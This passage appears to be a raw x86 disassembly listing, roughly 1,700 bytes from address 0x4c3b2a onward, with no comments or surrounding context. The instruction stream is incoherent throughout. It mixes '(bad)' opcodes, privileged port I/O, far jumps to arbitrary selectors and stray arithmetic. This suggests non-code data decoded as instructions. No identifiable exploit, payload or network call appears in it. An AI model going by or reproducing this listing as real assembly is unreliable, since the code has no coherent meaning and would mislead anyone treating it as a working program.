  4c3b2a:	add    edx,DWORD PTR [edx]
  4c3b2c:	cs dec ebx
  4c3b2e:	test   BYTE PTR [edx],0x30
  4c3b31:	add    BYTE PTR [ecx],ch
  4c3b33:	aas    
  4c3b34:	aas    
  4c3b35:	aas    
  4c3b36:	and    esi,edx
  4c3b38:	or     dh,BYTE PTR [edx]
  4c3b3a:	add    BYTE PTR [eax],bh
  4c3b3c:	xor    eax,DWORD PTR [eax]
  4c3b3e:	inc    ecx
  4c3b3f:	xor    al,0x0
  4c3b41:	dec    eax
  4c3b42:	aas    
  4c3b43:	aas    
  4c3b44:	aas    
  4c3b45:	aas    
  4c3b46:	pop    edx
  4c3b47:	add    BYTE PTR [ecx+0x5b],dl
  4c3b4a:	add    BYTE PTR [edx+0x35],bl
  4c3b4d:	add    BYTE PTR [eax+0x36],ah
  4c3b50:	add    BYTE PTR [edi+0x74],ah
  4c3b53:	cmp    al,0x3f
  4c3b55:	aas    
  4c3b56:	aaa    
  4c3b57:	add    BYTE PTR [esi+0x38],ch
  4c3b5a:	add    BYTE PTR [ebx+0x39],dh
  4c3b5d:	test   BYTE PTR [ebx],0x72
  4c3b60:	cmp    al,0x3f
  4c3b62:	sar    DWORD PTR [edx],cl
  4c3b64:	or     bh,BYTE PTR [ebx]
  4c3b66:	add    BYTE PTR [ebp-0x4d3915b4],cl
  4c3b6c:	sbb    cl,bl
  4c3b6e:	ret    
  4c3b6f:	xchg   ebp,eax
  4c3b70:	arpl   WORD PTR [ebx+ebp*4],bp
  4c3b73:	mov    bl,0xac
  4c3b75:	cdq    
  4c3b76:	inc    edi
  4c3b77:	popf   
  4c3b78:	loopne 0x4c3b5c
  4c3b7a:	mov    ds:0x3aa1576b,al
  4c3b7f:	mov    esi,0x460203a4
  4c3b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3b85:	jecxz  0x4c3b20
  4c3b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3b88:	loope  0x4c3b9c
  4c3b8a:	sbb    eax,DWORD PTR [edx]
  4c3b8c:	add    ebx,DWORD PTR [edx+ecx*1]
  4c3b8f:	sbb    eax,0x42448d54
  4c3b94:	iret   
  4c3b95:	call   DWORD PTR [edx]
  4c3b97:	mov    ds:0x67ff5822,eax
  4c3b9c:	and    DWORD PTR [ecx+0x10],edx
  4c3b9f:	jmp    FWORD PTR [eax-0x73c57844]
  4c3ba5:	add    DWORD PTR [edi-0x1],edx
  4c3ba8:	add    edi,DWORD PTR [esi+0x3e]
  4c3bab:	jle    0x4c3b6f
  4c3bad:	inc    edx
  4c3bae:	ins    DWORD PTR es:[edi],dx
  4c3baf:	test   DWORD PTR [ebx+0x442cf6d2],eax
  4c3bb5:	jnp    0x4c3ba1
  4c3bb7:	inc    edi
  4c3bb8:	mov    esi,0x13f8736
  4c3bbd:	sbb    esi,DWORD PTR [esi+0x21]
  4c3bc0:	add    DWORD PTR cs:[edi+0x7b],edi
  4c3bc4:	xor    al,0x70
  4c3bc6:	pop    eax
  4c3bc7:	mov    ah,0x3f
  4c3bc9:	or     ch,BYTE PTR [esi-0x134427fb]
  4c3bcf:	clc    
  4c3bd0:	push   es
  4c3bd1:	js     0x4c3c4a
  4c3bd3:	sbb    eax,0x52033880
  4c3bd8:	fist   DWORD PTR [ebx]
  4c3bda:	and    DWORD PTR [edx+0x4],esi
  4c3bdd:	jmp    0x4c3bcd
  4c3bdf:	pop    ebx
  4c3be0:	lds    eax,FWORD PTR [edi+0x47]
  4c3be3:	add    BYTE PTR [eax],0x13
  4c3be6:	sbb    al,0x1
  4c3be8:	pop    ebx
  4c3be9:	leave  
  4c3bea:	ja     0x4c3c07
  4c3bec:	jge    0x4c3c08
  4c3bee:	add    DWORD PTR [edx],edx
  4c3bf0:	pusha  
  4c3bf1:	push   esi
  4c3bf2:	aad    0x12
  4c3bf4:	in     eax,dx
  4c3bf5:	adc    BYTE PTR [eax],0x3f
  4c3bf8:	add    DWORD PTR [eax-0x14f1292c],eax
  4c3bfe:	adc    eax,DWORD PTR [ecx]
  4c3c00:	xchg   DWORD PTR [edx],ecx
  4c3c02:	pushf  
  4c3c03:	stos   DWORD PTR es:[edi],eax
  4c3c04:	push   cs
  4c3c05:	cmp    eax,DWORD PTR [eax]
  4c3c07:	cmp    al,0x8a
  4c3c09:	inc    eax
  4c3c0a:	mov    ds:0xff0e87df,al
  4c3c0f:	cld    
  4c3c10:	push   edx
  4c3c12:	(bad)  
  4c3c13:	cli    
  4c3c14:	jmp    edi
  4c3c16:	push   ebx
  4c3c18:	out    dx,al
  4c3c19:	mov    ebx,0xf8f40bfd
  4c3c1e:	std    
  4c3c1f:	idiv   DWORD PTR [edi]
  4c3c21:	icebp  
  4c3c22:	jmp    esi
  4c3c24:	(bad)  
  4c3c25:	out    dx,eax
  4c3c26:	(bad)  
  4c3c27:	clc    
  4c3c28:	pop    ds
  4c3c29:	in     al,dx
  4c3c2a:	push   esi
  4c3c2c:	(bad)  
  4c3c2d:	jmp    0x1503:0x5bffe912
  4c3c34:	mov    edx,0x5d4610
  4c3c39:	pop    esi
  4c3c3a:	mov    fs,WORD PTR [eax-0x42]
  4c3c3d:	push   ss
  4c3c3e:	shr    BYTE PTR [edi-0x6d9042e],1
  4c3c44:	call   FWORD PTR [ebx]
  4c3c46:	aas    
  4c3c47:	in     eax,dx
  4c3c48:	push   ebx
  4c3c49:	in     al,0x99
  4c3c4b:	ret    0xfbcf
  4c3c4e:	or     ecx,DWORD PTR [edx]
  4c3c50:	adc    dh,al
  4c3c52:	or     eax,0x1528f700
  4c3c57:	mov    edi,0xffeb2b3b
  4c3c5c:	cmc    
  4c3c5d:	das    
  4c3c5e:	call   0xf2bad462
  4c3c63:	scas   al,BYTE PTR es:[edi]
  4c3c64:	pop    ebp
  4c3c65:	mov    es,WORD PTR [edi+edx*1]
  4c3c68:	push   es
  4c3c69:	push   ds
  4c3c6a:	je     0x4c3c83
  4c3c6c:	dec    ebx
  4c3c6d:	dec    esi
  4c3c6e:	sahf   
  4c3c6f:	xchg   ebx,eax
  4c3c70:	jb     0x4c3c73
  4c3c72:	jae    0x4c3c78
  4c3c74:	outs   dx,BYTE PTR ds:[esi]
  4c3c75:	lahf   
  4c3c76:	rol    BYTE PTR [ecx],0xd2
  4c3c79:	ss ins DWORD PTR es:[edi],dx
  4c3c7b:	(bad)  
  4c3c7c:	outs   dx,BYTE PTR ds:[esi]
  4c3c7d:	add    DWORD PTR [ebp+0x6f16f277],edx
  4c3c83:	jo     0x4c3cd3
  4c3c85:	jno    0x4c3c85
  4c3c87:	mov    BYTE PTR [ecx+0x27],dh
  4c3c8a:	push   esi
  4c3c8b:	cs ins BYTE PTR es:[edi],dx
  4c3c8d:	jo     0x4c3c5d
  4c3c8f:	ins    BYTE PTR es:[edi],dx
  4c3c90:	outs   dx,DWORD PTR ds:[esi]
  4c3c91:	ja     0x4c3c99
  4c3c93:	mov    eax,0x8a2c4ed1
  4c3c98:	or     ah,BYTE PTR [edx]
  4c3c9a:	outs   dx,BYTE PTR ds:[esi]
  4c3c9b:	dec    eax
  4c3c9c:	jbe    0x4c3cb1
  4c3c9e:	aam    0x41
  4c3ca0:	add    BYTE PTR [ecx-0x2],ch
  4c3ca3:	ins    BYTE PTR es:[edi],dx
  4c3ca4:	popa   
  4c3ca5:	outs   dx,BYTE PTR ds:[esi]
  4c3ca6:	cli    
  4c3ca7:	mov    ebx,0x63f68dc0
  4c3cac:	outs   dx,BYTE PTR ds:[esi]
  4c3cad:	je     0x4c3d21
  4c3caf:	xchg   esi,eax
  4c3cb0:	add    BYTE PTR fs:[edx],al
  4c3cb3:	addr16 jb 0x4c3d17
  4c3cb6:	pusha  
  4c3cb7:	inc    ecx
  4c3cb8:	ins    BYTE PTR es:[edi],dx
  4c3cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3cba:	inc    esi
  4c3cbb:	add    BYTE PTR [esi+eiz*1-0x76918af6],cl
  4c3cc2:	mov    esi,0x73dcd88b
  4c3cc7:	jo     0x4c3ca3
  4c3cc9:	add    BYTE PTR [edi+0x6f],dh
  4c3ccc:	jb     0x4c3d32
  4c3cce:	sub    cl,BYTE PTR [esp+edx*2]
  4c3cd1:	add    al,0x91
  4c3cd3:	inc    edi
  4c3cd4:	das    
  4c3cd5:	push   es
  4c3cd6:	je     0x4c3cca
  4c3cd8:	xor    al,0x39
  4c3cda:	jnp    0x4c3ce2
  4c3cdc:	mov    al,ds:0x938b8040
  4c3ce1:	imul   edx,DWORD PTR [edi+0x5f],0x60
  4c3ce5:	pop    ss
  4c3ce6:	mov    al,ds:0x5bb4e02
  4c3ceb:	dec    ebx
  4c3cec:	sahf   
  4c3ced:	loopne 0x4c3d0f
  4c3cef:	xlat   BYTE PTR ds:[ebx]
  4c3cf0:	es ja  0x4c3c85
  4c3cf3:	imul   edx,DWORD PTR [edi+0x17c0404c],0xffffffe0
  4c3cfa:	jmp    0x13e9855
  4c3cff:	add    edi,edx
  4c3d01:	pop    ss
  4c3d02:	and    BYTE PTR [edx+0x6e2f8688],ch
  4c3d08:	outs   dx,DWORD PTR ds:[esi]
  4c3d09:	and    BYTE PTR [esi],al
  4c3d0b:	jb     0x4c3d1b
  4c3d0d:	pop    esp
  4c3d0e:	popa   
  4c3d0f:	(bad)  
  4c3d10:	es retfw 0x6e14
  4c3d15:	and    BYTE PTR fs:[edi+0x66],ch
  4c3d19:	and    BYTE PTR [eax-0x7a],dh
  4c3d1c:	aad    0x5a
  4c3d1e:	and    esp,edx
  4c3d20:	outs   dx,BYTE PTR ds:[esi]
  4c3d21:	arpl   WORD PTR es:[ecx],bp
  4c3d24:	or     BYTE PTR ds:0x72fc4ccc,dh
  4c3d2a:	arpl   WORD PTR gs:[edi+0x67],bp
  4c3d2e:	outs   dx,BYTE PTR ds:[esi]
  4c3d2f:	shr    BYTE PTR [esi],cl
  4c3d31:	push   0x60c2674
  4c3d36:	inc    eax
  4c3d37:	sub    bh,ah
  4c3d39:	ins    BYTE PTR es:[edi],dx
  4c3d3a:	sub    eax,0xaa3e383c
  4c3d3f:	jae    0x4c3d61
  4c3d41:	and    BYTE PTR [edx+eiz*2-0x1ccc7c48],bl
  4c3d48:	mov    ds:0x3c506f42,al
  4c3d4d:	out    0x44,al
  4c3d4f:	ret    
  4c3d50:	outs   dx,DWORD PTR ds:[esi]
  4c3d51:	jle    0x4c3d73
  4c3d53:	jnp    0x4c3dd2
  4c3d55:	and    BYTE PTR [ecx+0x75],dh
  4c3d58:	mov    esi,0x6a207c74
  4c3d5d:	xchg   BYTE PTR [edx+0x74204b6f],al
  4c3d63:	outs   dx,DWORD PTR ds:[esi]
  4c3d64:	add    BYTE PTR [edx-0x76],ah
  4c3d67:	aas    
  4c3d68:	(bad)  
  4c3d69:	out    dx,al
  4c3d6a:	dec    eax
  4c3d6b:	jl     0x4c3dda
  4c3d6d:	imul   esi,DWORD PTR [ebx+0x73],0x6e14b62e
  4c3d74:	div    BYTE PTR [ecx-0x13]
  4c3d77:	sub    eax,0xfa5d1774
  4c3d7c:	out    0x63,eax
  4c3d7e:	add    dh,BYTE PTR ds:0xc481da
  4c3d84:	xor    dh,BYTE PTR [esi+0x44]
  4c3d87:	push   ss
  4c3d88:	pop    ebx
  4c3d89:	pusha  
  4c3d8a:	adc    al,0x18
  4c3d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3d8d:	popa   
  4c3d8e:	mov    dh,0x73
  4c3d90:	mov    bl,BYTE PTR gs:[ebx]
  4c3d93:	in     eax,dx
  4c3d94:	adc    al,0x2
  4c3d96:	fs inc esp
  4c3d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c3d99:	push   ebp
  4c3d9a:	sbb    BYTE PTR ds:0x8a34146d,cl
  4c3da0:	xor    DWORD PTR gs:[ebx+0x6e],ecx
  4c3da4:	dec    esp
  4c3da5:	and    BYTE PTR [eax+0x7],dh
  4c3da8:	shl    ch,0x34
  4c3dab:	aam    0xa2
  4c3dad:	inc    ecx
  4c3dae:	xchg   BYTE PTR [ebx-0x3e],al
  4c3db1:	neg    BYTE PTR [ebx+0xd]
  4c3db4:	cld    
  4c3db5:	call   0x546d:0xd635076d
  4c3dbc:	aaa    
  4c3dbd:	pushfw 
  4c3dbf:	ins    BYTE PTR es:[edi],dx
  4c3dc0:	and    DWORD PTR [ecx+0x22],0xffffffc3
  4c3dc4:	sbb    BYTE PTR [edx],cl
  4c3dc6:	mov    WORD PTR [esi-0x69],?
  4c3dc9:	les    ebx,FWORD PTR [edi]
  4c3dcb:	or     BYTE PTR [edx+0x20797470],al
  4c3dd1:	push   ebp
  4c3dd2:	data16 xor al,ch
  4c3dd5:	push   es
  4c3dd6:	lods   al,BYTE PTR ss:[esi]
  4c3dd8:	leavew 
  4c3dda:	cmp    dl,dl
  4c3ddc:	or     al,0x2a
  4c3dde:	call   0x7dc83e5d
  4c3de3:	xchg   ebp,eax
  4c3de4:	ja     0x4c3d6d
  4c3de6:	sbb    BYTE PTR [ebp+0x280b6661],bl
  4c3dec:	aas    
  4c3ded:	and    BYTE PTR [edi+0x2d],ch
  4c3df0:	pop    es
  4c3df1:	daa    
  4c3df2:	xor    dh,bh
  4c3df4:	add    BYTE PTR [eax+0x4f],dl
  4c3df7:	push   ebx
  4c3df8:	dec    ecx
  4c3df9:	pop    eax
  4c3dfa:	and    ah,dl
  4c3dfc:	dec    edx
  4c3dfd:	dec    ebx
  4c3dfe:	lods   eax,DWORD PTR ds:[esi]
  4c3dff:	and    ah,cl
  4c3e01:	add    al,0xda
  4c3e03:	inc    esi
  4c3e04:	jb     0x4c3e1b
  4c3e06:	pushw  es
  4c3e08:	fwait
  4c3e09:	loopne 0x4c3e35
  4c3e0b:	outs   dx,DWORD PTR ds:[esi]
  4c3e0c:	xor    ah,ch
  4c3e0e:	ja     0x4c3e79
  4c3e10:	jne    0x4c3e44
  4c3e12:	inc    edi
  4c3e13:	(bad)  
  4c3e15:	push   ds
  4c3e16:	inc    ebx
  4c3e17:	mov    DWORD PTR [ecx],ebp
  4c3e19:	add    BYTE PTR [esi+eiz*2-0x62],dl
  4c3e1d:	sub    eax,0x7682660
  4c3e22:	stos   BYTE PTR es:[edi],al
  4c3e23:	outs   dx,BYTE PTR ds:[esi]
  4c3e24:	push   esi
  4c3e25:	sub    eax,0xdb6c360e
  4c3e2a:	and    BYTE PTR [edi+ecx*2],dl
  4c3e2d:	cmp    al,0x82
  4c3e2f:	bound  esi,QWORD PTR [ebp-0x4b9999b7]
  4c3e35:	xor    DWORD PTR [edi],0xffffffd3
  4c3e38:	xor    eax,0x64c37028
  4c3e3d:	enter  0x554e,0x4c
  4c3e41:	dec    esp
  4c3e42:	dec    eax
  4c3e43:	test   DWORD PTR [edi+0x6f7b4b7e],eax
  4c3e49:	add    eax,0xda417460
  4c3e4e:	std    
  4c3e4f:	je     0x4c3e79
  4c3e51:	jae    0x4c3e7c
  4c3e53:	and    BYTE PTR [eax-0x3d],dl
  4c3e56:	arpl   WORD PTR [ebx-0x3f],sp
  4c3e59:	loope  0x4c3e47
  4c3e5b:	cdq    
  4c3e5c:	sbb    ch,BYTE PTR [edx+0x1cda8000]
  4c3e62:	dec    edi
  4c3e63:	loope  0x4c3ec7
  4c3e65:	and    BYTE PTR [eax-0x6e2abfd8],dl
  4c3e6b:	push   es
  4c3e6c:	add    al,BYTE PTR [ecx+0x1a4ceae2]
  4c3e72:	cmp    al,0x3b
  4c3e74:	cmp    ebx,DWORD PTR [eax+0x14187a09]
  4c3e7a:	and    BYTE PTR [esi-0x4c21ef5c],0x8e
  4c3e81:	inc    ecx
  4c3e82:	sub    ah,BYTE PTR [edi+0x26]
  4c3e85:	xor    BYTE PTR [esi],0xf8
  4c3e88:	test   eax,0x67206340
  4c3e8d:	sbb    BYTE PTR [eax+0x76b0c46d],ah
  4c3e93:	jae    0x2f154712
  4c3e99:	mov    ecx,0xd1828bb5
  4c3e9e:	ret    
  4c3e9f:	add    BYTE PTR [edx+eax*8+0x76],ah
  4c3ea3:	sbb    ah,BYTE PTR [esi-0x3]
  4c3ea6:	sbb    ch,BYTE PTR [edx+0x18]
  4c3ea9:	sbb    al,0xbb
  4c3eab:	cmp    al,0x12
  4c3ead:	outs   dx,DWORD PTR ds:[esi]
  4c3eae:	imul   ebp,DWORD PTR [edx+0xe107064],0x66
  4c3eb5:	fnstcw WORD PTR [eax]
  4c3eb7:	je     0x4c3f33
  4c3eb9:	cmp    ebx,DWORD PTR [esi]
  4c3ebb:	or     edx,DWORD PTR [edi]
  4c3ebd:	push   es
  4c3ebe:	fsubr  DWORD PTR [ecx+0x78]
  4c3ec1:	push   0x6c
  4c3ec3:	sub    ebx,DWORD PTR [ecx-0x2983a340]
  4c3ec9:	rol    ah,1
  4c3ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3ecc:	mov    cl,0xb
  4c3ece:	pop    ebx
  4c3ecf:	je     0x4c3ef1
  4c3ed1:	jae    0x4c3eeb
  4c3ed3:	sbb    eax,0x8cd49e97
  4c3ed8:	shr    BYTE PTR [eax],1
  4c3eda:	test   BYTE PTR [edx-0x5ecab897],0x10
  4c3ee1:	or     BYTE PTR [esi+0x18],ch
  4c3ee4:	xor    bh,al
  4c3ee6:	ret    
  4c3ee7:	sar    BYTE PTR [edx],0x84
  4c3eea:	cmp    ch,BYTE PTR [esi-0x64]
  4c3eed:	xor    dl,0xc1
  4c3ef0:	jecxz  0x4c3f06
  4c3ef2:	mov    ch,0xfe
  4c3ef4:	outs   dx,BYTE PTR ds:[esi]
  4c3ef5:	loopne 0x4c3f6e
  4c3ef7:	cwde   
  4c3ef8:	nop
  4c3ef9:	ins    DWORD PTR es:[edi],dx
  4c3efa:	sbb    al,0x69
  4c3efc:	cmp    BYTE PTR [eax-0x1b],0x2d
  4c3f00:	popf   
  4c3f01:	sti    
  4c3f02:	cli    
  4c3f03:	adc    al,0x2d
  4c3f05:	push   es
  4c3f06:	push   edx
  4c3f07:	sti    
  4c3f08:	pop    ebx
  4c3f09:	sub    ebp,DWORD PTR ds:0xb78ed35d
  4c3f0f:	test   eax,0x7cd0a899
  4c3f14:	fistp  DWORD PTR gs:[eax+ecx*8+0x31]
  4c3f19:	mov    cl,BYTE PTR [edx+0x3d29e662]
  4c3f1f:	dec    ecx
  4c3f20:	dec    esp
  4c3f21:	mov    bh,0x3d
  4c3f23:	mov    eax,0x210037f5
  4c3f28:	pop    eax
  4c3f29:	xor    DWORD PTR [edx+0x58],0x3b9e8998
  4c3f30:	jne    0x4c3ee2
  4c3f32:	(bad)  
  4c3f33:	je     0x4c3f41
  4c3f35:	les    edi,FWORD PTR [ebp+0x0]
  4c3f38:	outs   dx,BYTE PTR ds:[esi]
  4c3f39:	sub    al,0x18
  4c3f3b:	jle    0x4c3fb1
  4c3f3d:	jno    0x4c3fab
  4c3f3f:	sbb    esi,ecx
  4c3f41:	push   eax
  4c3f42:	inc    ebx
  4c3f43:	push   edx
  4c3f44:	inc    ebp
  4c3f45:	adc    DWORD PTR [esi-0x7abba271],edi
  4c3f4b:	mov    ebp,0x603b5f33
  4c3f50:	stos   DWORD PTR es:[edi],eax
  4c3f51:	test   dh,bh
  4c3f53:	cmp    BYTE PTR [ebx+0x24],bh
  4c3f56:	sahf   
  4c3f57:	mov    edx,0x8faec34a
  4c3f5c:	leave  
  4c3f5d:	sub    dh,BYTE PTR [ebp-0x76]
  4c3f60:	push   ebp
  4c3f61:	mov    ch,0xbf
  4c3f63:	or     ebx,DWORD PTR [eax+edi*2+0x7b]
  4c3f67:	add    BYTE PTR cs:[ebp+0x33],bh
  4c3f6b:	xlat   BYTE PTR ds:[ebx]
  4c3f6c:	rcr    DWORD PTR [eax],0x46
  4c3f6f:	mov    ch,0x7d
  4c3f71:	jnp    0x4c3f6c
  4c3f73:	outs   dx,BYTE PTR ds:[esi]
  4c3f74:	shl    DWORD PTR [edi+0x5ca830a0],0x43
  4c3f7b:	mul    DWORD PTR [ecx-0x2f]
  4c3f7e:	mov    cs,WORD PTR [edi+0x5728060f]
  4c3f84:	add    BYTE PTR [edi+0x64],cl
  4c3f87:	outs   dx,DWORD PTR ds:[esi]
  4c3f88:	int3   
  4c3f89:	clc    
  4c3f8a:	mov    ah,0x6d
  4c3f8c:	add    eax,0x2c4ce49f
  4c3f91:	push   es
  4c3f92:	ins    BYTE PTR es:[edi],dx
  4c3f93:	dec    esi
  4c3f94:	jnp    0x4c4012
  4c3f96:	in     eax,dx
  4c3f97:	lock jne 0x4c3fab
  4c3f9a:	jge    0x4c3fae
  4c3f9c:	push   ebp
  4c3f9d:	sub    al,0x9b
  4c3f9f:	pop    esp
  4c3fa0:	jne    0x4c3f95
  4c3fa2:	or     DWORD PTR [esi+0x430775c1],edi
  4c3fa8:	sbb    eax,0x3532203e
  4c3fad:	xor    eax,0x6bce2876
  4c3fb2:	xchg   ecx,eax
  4c3fb3:	ret    0xcf99
  4c3fb6:	xor    al,0x2d
  4c3fb8:	or     al,0xc3
  4c3fba:	loope  0x4c3f8d
  4c3fbc:	bound  esp,QWORD PTR [ebx+0x75]
  4c3fbf:	ss inc eax
  4c3fc1:	push   es
  4c3fc2:	pop    es
  4c3fc3:	stos   DWORD PTR es:[edi],eax
  4c3fc4:	pushf  
  4c3fc5:	fucomip st,st(1)
  4c3fc7:	and    BYTE PTR [eax+0x30],dh
  4c3fca:	arpl   sp,si
  4c3fcc:	xor    ah,BYTE PTR [edi]
  4c3fce:	into   
  4c3fcf:	or     BYTE PTR [eax+esi*4],ah
  4c3fd2:	loope  0x4c3f77
  4c3fd4:	loope  0x4c3f78
  4c3fd6:	fist   WORD PTR [eax+0x54]
  4c3fd9:	jns    0x4c3ffd
  4c3fdb:	js     0x4c3f75
  4c3fdd:	arpl   WORD PTR [ebp-0x69],cx
  4c3fe0:	push   edi
  4c3fe1:	je     0x4c3fde
  4c3fe3:	fwait
  4c3fe4:	sub    BYTE PTR [esi],bl
  4c3fe6:	push   es
  4c3fe7:	or     eax,DWORD PTR ds:0x67144cef
  4c3fed:	retf   0x6b1d
  4c3ff0:	push   edi
  4c3ff1:	cmc    
  4c3ff2:	pop    ebp
  4c3ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c3ff4:	push   0xd287661
  4c3ff9:	out    0x5e,eax
  4c3ffb:	push   es
  4c3ffc:	jno    0x4c403c
  4c3ffe:	xchg   edi,eax
  4c3fff:	sbb    eax,DWORD PTR [edx+0x0]
  4c4002:	imul   ecx,DWORD PTR [ebx+0x7],0x27
  4c4006:	add    esp,ecx
  4c4008:	ret    
  4c4009:	pop    es
  4c400a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c400b:	pop    esp
  4c400c:	push   eax
  4c400d:	adc    dh,BYTE PTR [eax-0x67]
  4c4010:	sub    BYTE PTR [esi],bl
  4c4012:	movzx  ebx,WORD PTR [eax+ebx*2-0x7c]
  4c4017:	ins    DWORD PTR es:[edi],dx
  4c4018:	mov    ds:0xa2b60f2e,al
  4c401d:	push   ecx
  4c401e:	retf   
  4c401f:	aad    0x5c
  4c4021:	addr16 test al,0xc6
  4c4024:	xor    DWORD PTR [edx+0x6ed57570],ecx
  4c402a:	pop    ebx
  4c402b:	rol    DWORD PTR [eax],cl
  4c402d:	pop    es
  4c402e:	rol    BYTE PTR es:[edi],1
  4c4031:	pop    ebx
  4c4032:	test   DWORD PTR [edx],esp
  4c4034:	adc    al,0xc
  4c4036:	add    BYTE PTR [ecx+0x60ab5df],ch
  4c403c:	dec    edx
  4c403d:	adc    al,0xc0
  4c403f:	cld    
  4c4040:	imul   ebp,DWORD PTR [edx+ebp*8],0x2070d306
  4c4047:	xor    esi,DWORD PTR [edx]
  4c4049:	inc    ecx
  4c404a:	jae    0x4c4012
  4c404c:	inc    eax
  4c404d:	neg    eax
  4c404f:	sub    bh,BYTE PTR [eax]
  4c4051:	shl    WORD PTR [ebp+0x31],1
  4c4055:	xor    BYTE PTR [eax],al
  4c4057:	mov    al,0xc1
  4c4059:	push   ds
  4c405a:	pusha  
  4c405b:	push   esp
  4c405c:	jae    0x4c40a7
  4c405e:	lds    edx,FWORD PTR [esi-0x7d]
  4c4061:	in     al,dx
  4c4062:	cmp    BYTE PTR [eax],al
  4c4064:	outs   dx,DWORD PTR ds:[esi]
  4c4065:	cld    
  4c4066:	popa   
  4c4067:	ins    BYTE PTR es:[edi],dx
  4c4068:	jae    0x4c407e
  4c406a:	sbb    al,bl
  4c406c:	addr16 jmp 0x3733:0x5cfd725b
  4c4074:	aaa    
  4c4075:	mov    al,ds:0xdd7d74e6
  4c407a:	jo     0x4c4074
  4c407c:	dec    ebp
  4c407d:	ins    DWORD PTR es:[edi],dx
  4c407e:	bound  ebp,QWORD PTR [ecx]
  4c4080:	(bad)  
  4c4081:	(bad)  
  4c4083:	retf   0x856b
  4c4086:	dec    esp
  4c4087:	sub    esi,DWORD PTR [ebx+ebp*1-0x1bdc3eac]
  4c408e:	imul   edi,ecx,0x57
  4c4091:	mov    eax,ds:0x88201d12
  4c4096:	jbe    0x4c40ae
  4c4098:	xor    al,0x1b
  4c409a:	xor    BYTE PTR [eax-0x2b],bh
  4c409d:	add    BYTE PTR ds:0x346b63ac,ch
  4c40a3:	fild   QWORD PTR [esi]
  4c40a5:	sti    
  4c40a6:	dec    edx
  4c40a7:	add    al,0x4b
  4c40a9:	stos   DWORD PTR es:[edi],eax
  4c40aa:	push   eax
  4c40ab:	dec    esp
  4c40ac:	dec    esp
  4c40ad:	sahf   
  4c40ae:	inc    edx
  4c40af:	inc    BYTE PTR [eax]
  4c40b1:	inc    esp
  4c40b2:	inc    ebp
  4c40b3:	inc    esi
  4c40b4:	dec    ecx
  4c40b5:	dec    esi
  4c40b6:	inc    ebp
  4c40b7:	outs   dx,DWORD PTR ds:[esi]
  4c40b8:	outs   dx,BYTE PTR ds:[esi]
  4c40b9:	gs pusha 
  4c40bb:	or     cl,BYTE PTR [esi+edx*1]
  4c40be:	fld    QWORD PTR [edx]
  4c40c0:	lods   al,BYTE PTR ds:[esi]
  4c40c1:	ins    DWORD PTR es:[edi],dx
  4c40c2:	xchg   BYTE PTR [ecx+0x433bd569],bh
  4c40c8:	add    BYTE PTR [eax-0x29a1fad3],bh
  4c40ce:	stos   DWORD PTR es:[edi],eax
  4c40cf:	dec    eax
  4c40d0:	push   edi
  4c40d1:	dec    esp
  4c40d2:	push   ebx
  4c40d3:	pop    esp
  4c40d4:	fld    TBYTE PTR [esi+0x5cd2630b]
  4c40da:	addr16 pop ebp
  4c40dc:	jne    0x4c4080
  4c40de:	mov    eax,0x46c7611d
  4c40e4:	and    DWORD PTR [edi+0x78],esp
  4c40e7:	cmp    cl,BYTE PTR [esi+ebp*4]
  4c40ea:	hlt    
  4c40eb:	sub    eax,0x57b47a1a
  4c40f0:	sub    eax,eax
  4c40f2:	mov    ebp,DWORD PTR [ebx+0x21146fe4]
  4c40f8:	das    
  4c40f9:	jmp    0x791dc4ba
  4c40fe:	ins    DWORD PTR es:[edi],dx
  4c40ff:	in     al,0x7e
  4c4101:	sub    DWORD PTR [eax],esp
  4c4103:	adc    BYTE PTR [esi+eax*2-0x7e],ch
  4c4107:	adc    ebp,ebp
  4c4109:	push   eax
  4c410a:	sbb    esi,DWORD PTR [edi+0x1c]
  4c410d:	push   ebx
  4c410e:	mov    bh,0x20
  4c4110:	es js  0x4c4170
  4c4113:	cdq    
  4c4114:	or     BYTE PTR [esi],0x5e
  4c4117:	fidiv  WORD PTR [ebp-0x1]
  4c411a:	or     BYTE PTR [eax-0x248cee97],bl
  4c4120:	sub    bl,dh
  4c4122:	lea    eax,[eax+0x2c2961fb]
  4c4128:	adc    al,0x56
  4c412a:	adc    BYTE PTR ds:0x238a6fb,ch
  4c4130:	add    DWORD PTR [eax+0x12],0x42524556
  4c4137:	sub    DWORD PTR [ecx-0x3e],esi
  4c413a:	lods   eax,DWORD PTR ds:[esi]
  4c413b:	dec    edx
  4c413c:	ror    ecx,cl
  4c413e:	fwait
  4c413f:	mov    ds:0xec746a8c,al
  4c4144:	xchg   ebp,eax
  4c4145:	sti    
  4c4146:	xchg   edi,esi
  4c4148:	rol    DWORD PTR [eax],1
  4c414a:	pop    es
  4c414b:	xchg   ebx,edx
  4c414d:	sub    eax,DWORD PTR [eax]
  4c414f:	pop    ebp
  4c4150:	jge    0x4c4153
  4c4152:	xor    BYTE PTR [ebx+eax*1+0x3e],cl
  4c4156:	jge    0x4c41bc
  4c4158:	jle    0x4c415d
  4c415a:	pusha  
  4c415b:	mov    al,0x2a
  4c415d:	jnp    0x4c4131
  4c415f:	shr    BYTE PTR ds:0x53801c3e,cl
  4c4165:	add    eax,0xf3c11c21
  4c416a:	sbb    BYTE PTR [ecx+0x79fc52d2],bl
  4c4170:	mov    al,0x66
  4c4172:	in     eax,dx
  4c4173:	mov    al,0xa2
  4c4175:	sub    edi,0x74
  4c4178:	loope  0x4c41ed
  4c417a:	lahf   
  4c417b:	sbb    eax,0x9c1d54ae
  4c4181:	dec    edi
  4c4182:	sti    
  4c4183:	pop    esp
  4c4184:	push   edi
  4c4185:	and    BYTE PTR [eax+0x50],0x79
  4c4189:	mov    edx,0x86b02968
  4c418e:	stos   DWORD PTR es:[edi],eax
  4c418f:	or     al,0x6d
  4c4191:	mov    bl,0x5f
  4c4193:	ins    BYTE PTR es:[edi],dx
  4c4194:	shl    BYTE PTR [ecx+0x50433928],0x13
  4c419b:	jg     0x4c4148
  4c419d:	add    ecx,DWORD PTR [ebx-0x7a]
  4c41a0:	imul   edi,DWORD PTR [edx+0x49435341],0x8294a576
